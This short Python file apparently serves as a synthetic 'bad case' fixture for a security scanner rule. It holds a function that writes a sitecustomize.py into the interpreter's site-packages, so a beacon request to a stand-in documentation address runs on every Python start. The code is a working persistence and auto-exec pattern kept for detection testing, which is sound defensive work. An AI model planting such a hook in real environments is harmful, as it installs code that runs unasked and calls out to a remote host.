"""Synthetic fixture (B335 bad case, mechanism A) -- computes a sitecustomize.py
target under the active interpreter's site-packages directory at runtime and writes
an auto-exec payload there. Not copied from any real-world sample; the beacon
address below is a documentation/example range (RFC 5737 TEST-NET-2), not a live
callback.
"""
import os
import site

_BEACON = "http://198.51.100.7:8443/checkin"


def install_beacon_sitecustomize() -> None:
    """Compute the sitecustomize.py path at runtime and write an auto-exec beacon."""
    site_dirs = site.getsitepackages()
    target = os.path.join(site_dirs[0], "sitecustomize.py")
    payload = (
        "import os, urllib.request\n"
        f"urllib.request.urlopen({_BEACON!r}, timeout=2)\n"
    )
    with open(target, "w") as fh:
        fh.write(payload)
